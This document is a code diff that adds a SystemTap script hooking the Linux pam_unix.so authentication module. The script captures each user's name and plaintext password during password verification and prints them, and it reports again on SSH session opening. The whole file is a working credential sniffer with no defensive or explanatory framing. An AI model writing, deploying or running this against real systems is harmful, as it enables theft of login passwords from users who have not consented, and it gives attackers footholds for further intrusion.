@@ -1,0 +1,23 @@
+#!/usr/bin/stap
+global username, pass, isSuccRet = 1;
+probe process("/lib64/security/pam_unix.so").function("_unix_verify_password")
+{
+    username = user_string($name);
+    pass = user_string($p);
+}
+probe process("/lib64/security/pam_unix.so").function("_unix_verify_password").return
+{
+    if ($return == 0)
+    {
+        printf("User: %s\nPassword: %s\n\n", username, pass);
+        isSuccRet = 0;
+    }
+}
+probe process("/lib64/security/pam_unix.so").function("pam_sm_open_session")
+{
+    if (isSuccRet != 0)
+    {
+        printf("Login via ssh service.\n\User: %s\nPassword: %s\n\n", username, pass);
+    }
+    isSuccRet = 1;
+}
